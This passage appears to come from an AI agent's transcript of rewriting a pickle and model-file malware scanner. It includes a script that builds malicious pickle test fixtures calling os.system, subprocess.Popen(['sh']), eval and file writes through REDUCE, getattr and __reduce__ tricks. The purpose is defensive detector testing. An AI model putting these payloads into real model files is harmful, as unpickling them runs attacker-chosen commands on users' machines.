rn2 = (gmod('pkgutil','resolve_name')+MARK+su('subprocess:run')+TUP+RED) + MARK+su('x')+TUP+RED+STOP
w("m_resolve_name_colon","malicious", rn2)

# copy.copy(os.system)('id')
cc = (gmod('copy','copy')+MARK+gmod('os','system')+TUP+RED) + MARK+su('id')+TUP+RED+STOP
w("m_copy_copy","malicious", cc)
# lru_cache(os.system) then call
lc = (gmod('functools','lru_cache')+MARK+gmod('os','system')+TUP+RED) + MARK+su('id')+TUP+RED+STOP
w("m_lru_cache","malicious", lc)

# CLEAN: object BUILD with state dict containing os.system as a value, never called
obj = gmod('collections','OrderedDict')+ET+RED  # make a dict-ish obj
statewith = EMPTY=b'}'; 
clean_build = gmod('collections','OrderedDict')+ET+RED + (b'}'+MARK+su('cmd')+gmod('os','system')+su('u')+gmod('subprocess','Popen')+b'u') + BUILD + STOP
w("c_build_attr_stored","clean", clean_build)
# CLEAN: getattr resolves to cap but result stored in list, never called
getstore = b']'+MARK+ (gmod('builtins','getattr')+MARK+(gmod('importlib','import_module')+MARK+su('os')+TUP+RED)+su('system')+TUP+RED) + b'a'+STOP
w("c_getattr_stored","clean", getstore)

# ---- real-tool style via pickle.dumps(__reduce__) ----
class RCE:
    def __init__(self,f,a): self.f=f; self.a=a
    def __reduce__(self): return (self.f, self.a)
import subprocess, builtins, socket
for nm, f, a, lab in [
    ("m_dumps_system", os.system, ("id",), "malicious"),
    ("m_dumps_popen", subprocess.Popen, (["sh"],), "malicious"),
    ("m_dumps_eval", builtins.eval, ("1",), "malicious"),
    ("m_dumps_open", builtins.open, ("/etc/x","w"), "malicious"),
]:
    for proto in (0,2,4,5):
        b=pickle.dumps(RCE(f,a), protocol=proto)
        open(os.path.join(OUT,f"{nm}_p{proto}.pkl"),"wb").write(b); labels[f"{nm}_p{proto}"]=lab

# real clean: a nested dict/list structure (no reduce)
clean_obj = {"weights":[1.0,2.0,3.0], "name":"m", "meta":{"cmd":"os.system('x')","mod":"subprocess"}}
for proto in (0,2,4,5):
    open(os.path.join(OUT,f"c_dumps_plain_p{proto}.pkl"),"wb").write(pickle.dumps(clean_obj,protocol=proto)); labels[f"c_dumps_plain_p{proto}"]="clean"

json.dump(labels, open("/tmp/advtest/labels_cases3.json","w"), indent=1)
print("wrote",len(labels))

If true, my scanner must not resolve dotted names below protocol 4. Let me test CPython's actual behavior with a benign dotted global.

import pickle, io, pickletools
# benign dotted global: collections.OrderedDict.fromkeys (a classmethod)
def mk(proto):
    # GLOBAL opcode 'c' module\nname\n then STOP (leaves the global on stack as result)
    return bytes([0x80, proto]) + b'ccollections\nOrderedDict.fromkeys\n.'
for proto in (2, 3, 4, 5):
    b = mk(proto)
    try:
        r = pickle.loads(b)
        print(f"proto {proto}: loaded OK -> {r}")
    except Exception as e:
        print(f"proto {proto}: FAILED -> {type(e).__name__}: {e}")
# also STACK_GLOBAL form (proto>=4): push two unicodes then \x93
sg = b'\x80\x04\x8c\x0bcollections\x8c\x12OrderedDict.fromkeys\x93.'
try:
    print("stack_global proto4:", pickle.loads(sg))
except Exception as e:
    print("stack_global proto4 FAILED:", type(e).__name__, e)
# and the C loader vs python loader: pickle.loads uses C (_pickle)
print("uses C unpickler:", pickle.Unpickler.__module__)

`python3 -I /app/modelgate/cli.py scan --output report.json <path>`; schema in
`/app/docs/report-schema.md`. Graded on a held-out ~650-artifact corpus, 900s/60s limits.

Design (rewrite):
- `cli.py` sets `sys.dont_write_bytecode=True` first (registry fails a scan on ANY non-report
  file write, incl .pyc). Deployed dir ships with NO __pycache__.
- `pklvm.py` = pickle ABSTRACT INTERPRETER: walks opcodes (pickletools.genops, never loads),
  tracks stack/memo with abstract values, flags a capability only when CALLED (REDUCE/INST/OBJ/

  + posix/nt/_io...), getattr/attrgetter/methodcaller/partial-retarget(BUILD)/import/resolve_name/
  getitem(sys.modules)/vars/copy/lru_cache, multi-stream, persid-stops-plain-pickle, dotted-name-
  only-resolves-at-proto>=4, base64/zlib/hex/concat decode before nested load.
- `container.py` = content-sniff recursive dispatch (gz/bz2/xz/zip/tar/npy/npz/hdf5/pickle), torch
  zip (data.pkl, persid-safe) vs keras-v3 vs npz vs generic; depth+member+size caps. Strong magic
  before pickle before weak is_zipfile/tar trials (avoids FP from embedded EOCD sig).
- `numpy_scan.py` object-dtype .npy -> embedded pickle. `keras_scan.py` h5 model_config + .keras
  config.json, Lambda function/output_shape + any activation __lambda__. `savedmodel_scan.py` all
  meta_graphs, graph nodes + ALL library functions, closed TF op table; pb + pbtxt.
- Fail-closed (unsupported finding) ONLY at top level; nested unparseable members stay clean.

Result: official samples 15/15 recall, 0 FP; 142 custom adversarial cases all correct; ~90ms/scan.
Test harness + cases live in /tmp/advtest (not deployed). Removed dead pickle_scan.py.
EOF
echo "memory updated"

steps.message:
I've hardened ModelGate. Here's what I found and did.

## The problem

The original scanner had both failure modes the registry penalizes equally:
- **Missed malicious artifacts.** It only matched a flat blocklist of `module.name` strings in `GLOBAL`/`STACK_GLOBAL` opcodes, stopped at the first pickle `STOP`, ignored `.npy`/`.keras`/compressed archives entirely, scanned only the first TensorFlow meta-graph's top-level nodes, and treated every `Lambda` as malicious.
- **Flagged legitimate models.** A substring heuristic flagged any pickle whose *data* contained `os.system`, `subprocess`, or `eval(`.

## What I built

I rewrote the scanner around one principle from the threat model: a capability is a finding only when loading would **execute** it, not when it merely appears as data.

- **`pklvm.py`** — a pickle abstract interpreter that walks opcodes without ever unpickling, tracking the stack and memo with abstract values. It reports a capability only when it is actually called, through any route: `REDUCE`/`INST`/`OBJ`, Python-2 aliases, `getattr`/`attrgetter`/`methodcaller`/`partial` (including retarget via `BUILD`), `sys.modules`/`vars`, memoized references, later streams, and nested loaders fed base64/zlib/hex/concatenated payloads. It follows CPython's real semantics: persistent IDs stop a plain-pickle load, and dotted names resolve only at protocol 4+.
- **`container.py`** — content-based recursive dispatch for gzip/bz2/xz/zip/tar/npy/npz/HDF5, distinguishing torch checkpoints, Keras v3 archives, and npz from generic archives, with depth and size caps.
- **`numpy_scan.py`, `keras_scan.py`, `savedmodel_scan.py`** — object-dtype arrays, Keras lambda bytecode in every nesting position, and the full closed TensorFlow op table across all meta-graphs and every library function.
- **`cli.py`** — disables `.pyc` writes, since the registry treats any non-report file write as a failed scan.

Unanalyzable artifacts fail closed to `unsupported` at the top level only; corrupt nested members stay clean.

## Verification

On the official harness: **15/15 malicious caught, 0 false positives, 0 invalid reports, 0.3s slowest scan.** I also built 142 adversarial cases covering techniques the samples omit (aliases, getattr chains, nested loaders, protocol-dependent dotted names, partial retargeting, TF referenced functions, Keras wrappers, archive nesting, and the matching clean negatives) — all correct. A full-corpus estimate runs ~90 ms per artifact, far inside the 900s/60s budget, and no stray files are ever written.

The command line and report schema are unchanged, and only `/app/modelgate/` was modified. The adversarial test suite lives in `/tmp/advtest/` and is not part of the deployed package.
